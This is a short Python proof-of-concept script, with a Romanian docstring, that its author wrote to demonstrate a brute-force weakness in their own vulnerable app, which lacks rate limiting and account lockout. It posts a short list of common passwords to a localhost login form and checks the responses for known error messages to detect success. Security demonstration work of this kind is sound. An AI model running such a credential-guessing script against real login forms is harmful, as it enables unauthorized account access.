"""
Acesta este scriptul de hacking pe care l-am scris pentru a demonstra vulnerabilitatea de tip Brute Force la autentificare.
Pentru ca in versiunea V1 a aplicatiei mele (cea vulnerabila) nu am implementat rate limiting sau blocarea contului
dupa mai multe incercari gresite, un atacator poate sa ghiceasca parole la nesfarsit fara sa fie oprit.
Folosesc libraria externa 'requests' pentru a simula exact comportamentul browserului cand face submit la formularul de login.
Scriptul ia o lista scurta de parole predefinite si face request-uri POST succesive. Daca in HTML-ul primit inapoi de la server
nu se mai gasesc mesajele de eroare cunoscute, inseamna ca autentificarea a reusit. Reprezinta dovada (PoC) pentru raportul meu.
"""

import requests

adresa_tinta = "http://127.0.0.1:5000/login"
email_atacat = "test@test.com"
lista_parole_test = ["admin", "qwerty", "password123", "12345678", "1234"]

print(f"[*] Starting Brute Force attack on: {email_atacat}...\n")

for parola_curenta in lista_parole_test:
    print(f"[*] Trying: {parola_curenta}")

    date_formular = {
        "email": email_atacat,
        "password": parola_curenta
    }

    raspuns_server = requests.post(adresa_tinta, data=date_formular)

    if "Incorrect password" not in raspuns_server.text and "User does not exist" not in raspuns_server.text:
        print(f"\n[+] SUCCESS! Password cracked: {parola_curenta}")
        break